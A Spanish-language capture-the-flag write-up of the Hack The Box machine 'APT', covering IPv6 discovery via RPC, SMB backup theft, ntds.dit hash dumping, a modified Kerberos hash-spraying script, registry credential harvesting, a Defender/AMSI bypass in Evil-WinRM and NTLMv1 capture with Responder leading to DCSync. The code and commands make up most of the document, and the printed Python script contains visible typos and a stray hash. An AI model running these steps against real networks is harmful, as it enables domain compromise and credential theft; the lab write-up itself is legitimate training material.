---
layout: ../layouts/SavinoteLayout.astro
title: "HTB_Apt"
date: 2023-07-10
slug: HTB_Apt
heroImage: /assets/machines.jpg
---

# APT {-}

## Introduccion {-}

La maquina del dia se llama APT.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/VxE1cfvXjA0/0.jpg)](https://www.youtube.com/watch?v=VxE1cfvXjA0)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.213
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.213
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.213 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,135 10.10.10.213 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 80     | http     | Web Fuzzing        |            |
| 135    | msrpc    |                    |            |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.213
```

Es un IIS 10.0 y poco mas.

#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.213 
```
, vemos una web que habla de un hosting.

#### Fuzzing {-}

```bash
nmap --script http-enum -p80 10.10.10.213 -oN webScan
```

### Analyzando el puerto 135

Buscando con firefox 
```bash
 port 135 msrpc pentesting 
```
 vemos un articulo en la web de [hacktricks](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc).
Aqui podemos ver que hay una posibilidad de abusar del methodo **ServerAlive2** con una heramienta llamada [IOXIDResolver](https://github.com/mubix/IOXIDResolver).
## Vulnerability Assessment {-}

### Abusando del methodo ServerAlive2 {-}

```bash
git clone https://github.com/mubix/IOXIDResolver
cd IOXIDResolver
pip3 install -r requirements.txt
python3 IOXIDResolver.py -t 10.10.10.213
```

En este caso, el abuso del methodo nos muestra la ipv6 de la maquina victima. Lo verificamos con un ping

```bash
ping6 dead:beef::b885:d62a:d679:573f
```

Aqui vemos que la maquina nos responde.

### Buscamos mas puertos con IPV6 {-}

```bash
nmap -sS --min-rate 5000 --open -vvv -n -Pn -6 dead:beef::b885:d62a:d679:573f -oG allPortsipv6
extractPorts allPortsipv6
nmap -sCV -p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,29685,49693 -6 dead:beef::b885:d62a:d679:573f -oN targetedipv6
```

Aqui vemos un monton de puertos que no vamos a explicar porque ya lo hemos contemplado varias veces. Pero mirando los mas importantes vemos:

- el puerto 135 (smb) esta abierto
- el 88 (kerberos)
- el 389 (ldap)
- el 5985 (WinRM)

y con esto ya sabemos que estamos frente a un Domain Controller.

### Usando las heramientas basicas con IPV6 {-}

#### CrackMapExec {-}

Aqui vamos a por **crackMapExec**. La version que utiliza S4vitaar es la *5.1.1 dev* que no permite usar IPV6 y tiene que subir a la version *5.1.7 dev*

```bash
pushd /opt
curl -sSL https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py | python -
apt-get install -y libssl-dev libffi-dev python-dev build-essential
git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
cd CrackMapExec
poetry install
poetry run crackMapExec smb dead:beef::b885:d62a:d679:573f
```

Vemos que la maquina se llama apt y que el dominio es htb.local. Añadimos los dos en el 
```bash
 /etc/hosts 
```


```bash
dead:beef::b885:d62a:d679:573f  apt htb.local
```

#### CrackMapExec via alternativa {-}

Una via alternativa seria redirigir el flujo de nuestro puerto 445 local hacia el puerto 445 de la maquina victima con **socat**.

1. redirigimos el puerto 445

    ```bash
    socat TCP-LISTEN:445,fork TCP:apt:445
    ```

1. uzamos la version mas antigua de crackmap exec a nuestra maquina local

    ```bash
    crackmapexec smb localhost
    ```

#### SmbClient {-}

Miramos los recursos compartidos a nivel de red con **smbclient**

```bash
smbclient -L dead:beef::b885:d62a:d679:573f -N
```

Vemos un directorio backup. Miramos si nos podemos connectar.

```bash
smbclient //dead:beef::b885:d62a:d679:573f/backup -N
dir
get backup.zip
```

Aqui hay un backup.zip y lo descargamos a nuestro equipo de atacante. Si intentamos unzipear el archivo vemos que esta protegido por contraseña.

### Crackeando la contraseña con fcrackzip {-}

```bash
fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt backup.zip
```

Aqui podemos ver la contraseña.

```bash
unzip backup.zip
```

Aqui podemos ver que tenemos un **ntds.dit** y un **SYSTEM**. Esto quiere decir que podemos jugar con **SecretsDump**

### SecretsDump {-}

Teniendo un ntds.dit y un SYSTEM, podemos pillar los hashes NTLMv2 de los usuarios del Directorio Activo. Como lo hacemos desde nuestra
maquina local, tenemos que ponerle un **LOCAL** al final.

```bash
impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL
```

Aqui recuperamos un monton de informacion. Vamos a tratar de recojer unicamente la informacion que nos interesa. Vemos que todo los usuarios tienen un 
hash **aad3b435b51404eeaad3b435b51404ee**.

```bash
impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL | grep "aad3b435b51404eeaad3b435b51404ee" > data
```

Intentamos un pass the hash con el usuario Administrator

```bash
pushd /opt/CrackMapExec
poetry run crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'Administrator' -H '2b576acbe6bcfda7294d6bd18041b8fe'
```

Vemos que no podemos hacer pass the hash a todos los usuarios, Tenemos que recuperar un listado de usuarios validos.

1. Creamos un fichero de usuarios

    ```bash
    cat data | awk '{print $1}' FS=":" | wc -l
    cat data | awk '{print $1}' FS=":" | sort -u | wc -l
    cat data | awk '{print $1}' FS=":" > users
    ```

1. creamos un fichero de hashes NT

    ```bash
    cat data | awk '{print $4}' FS=":" > hash
    ```

Aqui vamos a intentar bruteforcear los usuarios con kerbrute.

### Kerbrute {-}

Aqui vamos a tirar del **kerbrute** para tratar de brueforcear el Kerberos para conocer los usuarios validos

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build -ldflags "-s -w" .
upx kerbrute
```

Ya podemos enumerar los usuarios 

```bash
./kerbrute userenum --dc apt -d htb.local ../users
```

Aqui vemos que hay un usuario **henry.vinson@htb.local** que es valido.

Si intentamos un pass the hash con este usuario

```bash
pushd /opt/CrackMapExec
poetry run crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H '2de80758521541d19cabbba480b260e8f'
```

Vemos que el hash no es valido. Aqui intentamos ver si el hash de este usuario esta en la lista de los hashes pero como kerbrute o otra heramientas
como pyKerbrute no nos permiten hacer un bruteforce de hashes, nos creamos nuestro proprio script en python

> [ ! ] NOTAS: podriamos intentar bruteforcear hashes con smb con el comando 
```bash
 poetry run crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H /home/s4vitar/Desktop/APT/content/hash 
```
 pero 
se bloquea a partir de unos cuantos hash (seguridad de smb). 

### Script de bruteforce de hashes {-}

Aqui en vez de crear nuestro script desde zero, uzamos el script en python de [pyKerbrute](https://github.com/3gstudent/pyKerbrute) y la modificamos
El script que nos interessa es el ADPwdSpray.py.

```python
#!/usr/bin/python
import sys, os
import socket, signal
from pwn import *
from random import getrandbits
from time import time, localtime, strftime
from pyasn1.type.univ import Integer, Sequence, SequenceOf, OctetString, BitString, Boolean
from pyasn1.type.char import GeneralString
from pyasn1.type.useful import GeneralizedTime
from pyasn1.type.tag import Tag, tagClassContext, tagClassApplication, tagFormatSimple
from pyasn1.codec.der.encoder import encode
from struct import pack, upack
from pyasn1.type.namedtype import NamedTypes, NamedType, OptionalNamedType
from _crypto import ARC4, MD5, MD4
from time import time, gmtime, strftime, strptime, localtime
import hmac as HMAC
from random import getrandbits, sample

RC4_HMAC = 23
NT_PRINCIPAL = 1
NT_SRV_INST = 2

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")aad3b435b51404eeaad3b435b51404ee
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def random_bytes(n):
    return ''.join(chr(c) for c in sample(xrange(256), n))

def encrypt(etype, key, msg_type, data):
    if etype != RC4_HMAC:
        raise NotImplementedError('Only RC4-HMAC supported!')
    k1 = HMAC.new(key, pack('<I', msg_type)).digest()
    data = random_bytes(8) + data
    chksum = HMAC.new(k1, data).digest()
    k3 = HMAC.new(k1, chksum).digest()
    return chksum + ARC4.new(k3).encrypt(data)

def epoch2gt(epoch=None, microseconds=False):
    if epoch is None:
        epoch = time()
    gt = strftime('%Y%m%d%H%M%SZ', gmtime(epoch))
    if microseconds:
        ms = int(epoch * 1000000) % 1000000
        return (gt, ms)
    return gt



def ntlm_hash(pwd):
    return MD4.new(pwd.encode('utf-16le'))

def _c(n, t):
    return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n))

def _v(n, t):
    return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n), cloneValueFlag=True)


def application(n):
    return Sequence.tagSet + Tag(tagClassApplication, tagFormatSimple, n)

class Microseconds(Integer): pass

class KerberosString(GeneralString): pass

class Realm(KerberosString): pass

class PrincipalName(Sequence):
    componentType = NamedTypes(
        NamedType('name-type', _c(0, Integer())),
        NamedType('name-string', _c(1, SequenceOf(componentType=KerberosString()))))

class KerberosTime(GeneralizedTime): pass

class HostAddress(Sequence):
    componentType = NamedTypes(
        NamedType('addr-type', _c(0, Integer())),
        NamedType('address', _c(1, OctetString())))

class HostAddresses(SequenceOf):
    componentType = HostAddress()


class PAData(Sequence):
    componentType = NamedTypes(
        NamedType('padata-type', _c(1, Integer())),
        NamedType('padata-value', _c(2, OctetString())))

    
class KerberosFlags(BitString): pass

class EncryptedData(Sequence):
    componentType = NamedTypes(
        NamedType('etype', _c(0, Integer())),
        OptionalNamedType('kvno', _c(1, Integer())),
        NamedType('cipher', _c(2, OctetString())))
    
class PaEncTimestamp(EncryptedData): pass


class Ticket(Sequence):
    tagSet = application(1)
    componentType = NamedTypes(
        NamedType('tkt-vno', _c(0, Integer())),
        NamedType('realm', _c(1, Realm())),
        NamedType('sname', _c(2, PrincipalName())),
        NamedType('enc-part', _c(3, EncryptedData())))
    
class KDCOptions(KerberosFlags): pass

class KdcReqBody(Sequence):
    componentType = NamedTypes(
        NamedType('kdc-options', _c(0, KDCOptions())),
        OptionalNamedType('cname', _c(1, PrincipalName())),
        NamedType('realm', _c(2, Realm())),
        OptionalNamedType('sname', _c(3, PrincipalName())),
        OptionalNamedType('from', _c(4, KerberosTime())),
        NamedType('till', _c(5, KerberosTime())),
        OptionalNamedType('rtime', _c(6, KerberosTime())),
        NamedType('nonce', _c(7, Integer())),
        NamedType('etype', _c(8, SequenceOf(componentType=Integer()))))

class KdcReq(Sequence):
    componentType = NamedTypes(
        NamedType('pvno', _c(1, Integer())),
        NamedType('msg-type', _c(2, Integer())),
        NamedType('padata', _c(3, SequenceOf(componentType=PAData()))),
        NamedType('req-body', _c(4, KdcReqBody())))

class PaEncTsEnc(Sequence):
    componentType = NamedTypes(
        NamedType('patimestamp', _c(0, KerberosTime())),
        NamedType('pausec', _c(1, Microseconds())))


class AsReq(KdcReq):
    tagSet = application(10)

def build_req_body(realm, service, host, nonce, cname=None):
 
    req_body = KdcReqBody()

    # (Forwardable, Proxiable, Renewable, Canonicalize)
#   req_body['kdc-options'] = "'01010000100000000000000000000000'B"
    req_body['kdc-options'] = "'00000000000000000000000000010000'B"
    if cname is not None:
        req_body['cname'] = None
        req_body['cname']
        req_body['cname']['name-type'] = NT_PRINCIPAL
        req_body['cname']['name-string'] = None
        req_body['cname']['name-string'][0] = cname

    req_body['realm'] = realm

    req_body['sname'] = None
    req_body['sname']['name-type'] = NT_SRV_INST
    req_body['sname']['name-string'] = None
    req_body['sname']['name-string'][0] = service
    req_body['sname']['name-string'][1] = host

    req_body['till'] = '19700101000000Z'
    
    req_body['nonce'] = nonce

    req_body['etype'] = None
    req_body['etype'][0] = RC4_HMAC
    
    return req_body

def build_pa_enc_timestamp(current_time, key):
    gt, ms = epoch2gt(current_time, microseconds=True)
    pa_ts_enc = PaEncTsEnc()
    pa_ts_enc['patimestamp'] = gt
    pa_ts_enc['pausec'] = ms

    pa_ts = PaEncTimestamp()
    pa_ts['etype'] = key[0]
    pa_ts['cipher'] = encrypt(key[0], key[1], 1, encode(pa_ts_enc))

    return pa_ts


def build_as_req(target_realm, user_name, key, current_time, nonce):

    req_body = build_req_body(target_realm, 'krbtgt', target_realm, nonce, cname=user_name)
    pa_ts = build_pa_enc_timestamp(current_time, key)
    
    as_req = AsReq()

    as_req['pvno'] = 5
    as_req['msg-type'] = 10

    as_req['padata'] = None
    as_req['padata'][0] = None
    as_req['padata'][0]['padata-type'] = 2
    as_req['padata'][0]['padata-value'] = encode(pa_ts)


    as_req['req-body'] = _v(4, req_body)

    return as_req

def send_req_tcp(req, kdc, port=88):
    data = encode(req)
    data = pack('>I', len(data)) + data
    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def send_req_udp(req, kdc, port=88):
    data = encode(req)
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def recv_rep_tcp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) >= 4:
            if datalen is None:
                datalen = unpack('>I', rep[:4])[0]
            if len(data) >= 4 + datalen:
                sock.close()
                return data[4:4 + datalen]

def recv_rep_udp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) >= 4:
            sock.close()
            return data

def _decrypt_rep(data, key, spec, enc_spec, msg_type):
    rep = decode(data, asn1Spec=spec)[0]
    rep_enc = str(rep['enc-part']['cipher'])
    rep_enc = decrypt(key[0], key[1], msg_type, rep_enc)
    rep_enc = decode(rep_enc, asn1Spec=enc_spec)[0]
    
    return rep, rep_enc
    

def passwordspray_tcp(user_realm, user_name, user_key, kdc_a, orgin_key):
    nonce = getrandbits(31)
    current_time = time()
    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce)
    sock = send_req_tcp(as_req, kdc_a)
    data = recv_rep_tcp(sock)
    i=0
    for c in data:       
        i=i+1
        if(i==18):
            if(ord(c)==0x0b):
                print('[+] Valid Login: %s:%s'%(user_name,orgin_key))

if __name__ == '__main__':
    user_realm = 'htb.local'
    username = 'henry.vinson'
    kdc_a = 'apt'

    f = open("hash", "r")
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    number = 1
    for ntlm in f.readlines():
        ntlm = ntlm.strip('\n')
        p1.status("Probando con el Hash [%s/2000]: %s" % (str(number), ntlm)
        user_key = (RC4_HMAC, ntml.decode('hex'))
        passwordspray_tcp(user_realm, username, user_key, kdc_a, ntlm)

```

Hemos cambiado el **socket.AF_INET** en **socket.AF_INET6** y el main para que podamos leer el fichero de hashes.

Lanzando el script, encontramos un hash valido. Lo verificamos

```bash
pushd /opt/CrackMapExec
poetry run crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H 'e53d87d42adaa3ca32bdb34a876cbffb'
```

> [ ! ] NOTAS: Podriamos hacer ASProasting o Kerberoasting attack pero S4vi nos adelanta que no funcciona y que ademas es complicado con IPV6


### Dumpeo de registros desde la maquina local {-}

Los registros se pueden dumpear desde la maquina local. Es interessante siempre probar esto porque se puede encontrar informaciones de esta manera.
Los registros son:

- HKCR
- HKCU
- HKLM
- HKU
- HKCC
- HKPD

Utilizamos la heramienta **reg.py** de impacket para lograr esto.

```bash
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKCR
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKCU
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKLM
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU
```


Aqui vemos informaciones interesantes, y miramos por lo que nos parece interesante

```bash
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software\\GiganticHostingManagementSystem
```

Aqui encontramos usuario y contraseña para henry.vinson_adm. Verificamos las credenciales

```bash
pushd /opt/CrackMapExec
poetry run crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
```

Es valida y intentamos connectarnos con Evil-WinRM
## Vuln exploit & Gaining Access {-}

### WinRM {-}

```bash
gem install evil-winrm
evil-winrm -i apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
```

Nos conectamos y podemos leer la flag.


## Privilege Escalation {-}

### Rootear la maquina {-}

Aqui vamos a tirar de **WinPeas**. Descargamos el winPEAS en nuestro equipo de atacante

```bash
wget https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
```

Il lo cargamos desde Evil-WinRM

```powershell
cd C:\Users\henry.vinson_adm\AppData\Local\Temp
upload winPEASx64.exe
dir
.\winPEASx64.exe
```

Aqui vemos que no podemos lanzar el exe porque no lo pilla el antivirus. En este caso el defender no nos deja passar por los bypass normales
pero podemos hacer cositas con funcciones de Evil-WinRM.

```powershell
menu
Bypass-4MSI
Invoke-Binary /home/s4vitar/Desktop/HTB/APT/content/winPEASx64.exe
```

Tenemos que esperar que se acabe la ejecucion para ver el resultado.

Aqui no vemos nada interessante. Probamos otre binario de analysis, el [Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/).

```bash
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe
```

Lo cargamos nuevamente a la maquina victima

```powershell
Invoke-Binary /home/s4vitar/Desktop/HTB/APT/content/Seatbelt.exe
Invoke-Binary /home/s4vitar/Desktop/HTB/APT/content/Seatbelt.exe -group=all
```

Aqui podemos ver que el NTLM de version 1 esta expuesta en esta maquina.

Aqui vamos a tirar de [crack.sh](https://crack.sh/cracking-ntlmv1-w-ess-ssp/) en lo cual podemos tratar de utilizar el **responder** para
recuperar la llaves y crackearlas con [crack.sh](https://crack.sh)

1. Modificamos el fichero de configuracion de responder

    ```bash
    cd /usr/share/responder
    vi Responder.conf

    # cambiamos el challenge 
    Challenge = 1122334455667788
    ```

1. lanzamos el responder

    ```bash
    python3 responder.py -I tun0 --lm
    ```

1. desde la maquina victima aprovechamos del defender para scanear ficheros

    ```bash
    cd C:\Program Files\Windows Defender
    .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.8\algoquenoexiste
    ```

Aqui vemos que hemos pillado el hash NTLMv1 de la propria maquina. Lo copiamos y usamos de ntlmv1-multi para crear el hash necessario para
romper con crack.sh

```bash
git clone https://github.com/evilmog/ntlmv1-multi
cd ntlmv1-multi
python3 ntlmv1.py --ntlmv1 'APT$::HTB:95ACA8C72487742B427E1AE5B8D5CE6830A49B5BBB58D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788'
```

Aqui podemos copiar el hash en [crack.sh](https://crack.sh) usando un temporary email y recivimos un mail con la key.

```bash
impacket-secretsdump -hashes :d167c32388864b12f5f82feae86a7f798 'htb.local/APT$@apt'
```

Aqui ya vemos los hash de los usuarios y con evil-winRM no connectamos con el usuario administrator

```bash
evil-winrm -i apt -u 'Administrator' -H 'c370bddf384a691d811ff3495e8a72e2'
```

y visualizar la flag.
